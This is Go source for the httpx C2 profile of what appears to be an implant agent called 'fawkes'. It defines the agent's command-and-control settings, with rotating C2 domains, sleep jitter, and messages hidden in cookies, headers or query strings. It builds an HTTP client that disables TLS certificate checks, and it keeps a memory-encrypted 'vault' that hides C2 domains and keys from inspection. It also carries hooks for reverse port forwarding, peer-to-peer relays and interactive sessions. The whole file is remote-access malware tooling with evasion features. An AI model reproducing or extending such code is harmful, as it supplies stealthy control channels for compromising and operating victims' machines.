package httpx

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"

	"fawkes/pkg/structs"
)

// AgentConfig is the parsed raw_c2_config JSON from the httpx C2 profile.
type AgentConfig struct {
	Name string     `json:"name"`
	Get  VerbConfig `json:"get"`
	Post VerbConfig `json:"post"`
}

// VerbConfig defines the HTTP method, URIs, and client/server transform configs.
type VerbConfig struct {
	Verb   string       `json:"verb"`
	URIs   []string     `json:"uris"`
	Client ClientConfig `json:"client"`
	Server ServerConfig `json:"server"`
}

// ClientConfig defines headers, parameters, message location, and transforms
// for the agent's outgoing requests.
type ClientConfig struct {
	Headers               map[string]string            `json:"headers"`
	Parameters            map[string]string            `json:"parameters"`
	DomainSpecificHeaders map[string]map[string]string `json:"domain_specific_headers"`
	Message               MessageConfig                `json:"message"`
	Transforms            []Transform                  `json:"transforms"`
}

// ServerConfig defines headers and transforms for the server's responses.
type ServerConfig struct {
	Headers    map[string]string `json:"headers"`
	Transforms []Transform       `json:"transforms"`
}

// MessageConfig specifies where the agent places its message in the HTTP request.
type MessageConfig struct {
	Location string `json:"location"` // "cookie", "query", "header", "body", or ""
	Name     string `json:"name"`     // name for cookie/query/header location
}

// sensitiveConfig holds fields that should not persist as plaintext in memory.
type sensitiveConfig struct {
	Domains       []string     `json:"d"`
	EncryptionKey string       `json:"k"`
	CallbackUUID  string       `json:"c"`
	Config        *AgentConfig `json:"cfg"`
}

// configVault holds AES-256-GCM encrypted C2 configuration.
type configVault struct {
	key  []byte
	blob []byte
}

// HTTPXProfile implements the Profile interface for the httpx C2 profile.
type HTTPXProfile struct {
	Domains           []string
	DomainRotation    string // "fail-over", "round-robin", "random"
	FailoverThreshold int
	EncryptionKey     string
	MaxRetries        int
	SleepInterval     int
	Jitter            int
	Debug             bool
	Config            *AgentConfig
	CallbackUUID      string
	ProxyURL          string
	client            *http.Client

	// Domain rotation state
	activeDomainIdx atomic.Int32
	failCount       atomic.Int32
	uriIdx          atomic.Uint32

	// Config vault
	vault *configVault

	// P2P delegate hooks
	GetDelegatesOnly     func() []structs.DelegateMessage
	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates      func(delegates []structs.DelegateMessage)

	// Rpfwd hooks
	GetRpfwdOutbound func() []structs.SocksMsg
	HandleRpfwd      func(msgs []structs.SocksMsg)

	// Interactive hooks
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

// NewHTTPXProfile creates a new httpx C2 profile instance.
func NewHTTPXProfile(
	domains []string,
	rotation string,
	failoverThreshold int,
	encryptionKey string,
	maxRetries int,
	sleepInterval int,
	jitter int,
	debug bool,
	config *AgentConfig,
	proxyURL string,
) *HTTPXProfile {
	profile := &HTTPXProfile{
		Domains:           domains,
		DomainRotation:    rotation,
		FailoverThreshold: failoverThreshold,
		EncryptionKey:     encryptionKey,
		MaxRetries:        maxRetries,
		SleepInterval:     sleepInterval,
		Jitter:            jitter,
		Debug:             debug,
		Config:            config,
		ProxyURL:          proxyURL,
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // Skip TLS verification for self-signed C2 certs
		},
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}

	if proxyURL != "" {
		if proxyU, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxyU)
		}
	}

	profile.client = &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}

	return profile
}

// SealConfig encrypts sensitive fields into the config vault.
func (h *HTTPXProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		Domains:       h.Domains,
		EncryptionKey: h.EncryptionKey,
		CallbackUUID:  h.CallbackUUID,
		Config:        h.Config,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		zeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	zeroBytes(plaintext)
	if blob == nil {
		zeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	h.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields
	h.Domains = nil
	h.EncryptionKey = ""
	h.CallbackUUID = ""
	h.Config = nil

	return nil
}

// getConfig returns the current C2 configuration, decrypting from vault if active.
func (h *HTTPXProfile) getConfig() *sensitiveConfig {
	if h.vault == nil {
		return &sensitiveConfig{
			Domains:       h.Domains,
			EncryptionKey: h.EncryptionKey,
			CallbackUUID:  h.CallbackUUID,
			Config:        h.Config,
		}
	}

	plaintext := vaultDecrypt(h.vault.key, h.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		zeroBytes(plaintext)
		return nil
	}
	zeroBytes(plaintext)
	return &cfg
}

// UpdateCallbackUUID updates the callback UUID in the vault or struct.
func (h *HTTPXProfile) UpdateCallbackUUID(uuid string) {
	if h.vault != nil {
		cfg := h.getConfig()
		if cfg != nil {
			cfg.CallbackUUID = uuid
			plaintext, err := json.Marshal(cfg)
			if err == nil {
				newBlob := vaultEncrypt(h.vault.key, plaintext)
				zeroBytes(plaintext)
				if newBlob != nil {
					zeroBytes(h.vault.blob)
					h.vault.blob = newBlob
				}
			}
		}
		return
	}
	h.CallbackUUID = uuid
}

// GetCallbackUUID returns the callback UUID.
func (h *HTTPXProfile) GetCallbackUUID() string {
	if h.vault != nil {
		cfg := h.getConfig()
		if cfg != nil {
			return cfg.CallbackUUID
		}
	}
	if h.CallbackUUID != "" {
		return h.CallbackUUID
	}
	return ""
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
func (h *HTTPXProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
	if cfg.CallbackUUID != "" {
		return cfg.CallbackUUID
	}
	return agent.PayloadUUID
}

